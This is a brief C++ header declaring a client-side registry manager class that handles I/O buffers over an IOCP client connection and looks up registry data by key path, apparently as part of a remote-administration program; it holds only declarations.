#pragma once
#include "Manager.h"
#include "Register.h"
class CClientRegisterManager :
	public CManager
{
public:
	CClientRegisterManager(_CIOCPClient* ClientObject);
	~CClientRegisterManager();
	virtual void HandleIO(PBYTE BufferData, ULONG_PTR BufferLength);
	VOID FindRegisterData(char IsToken, char* KeyPath);
};

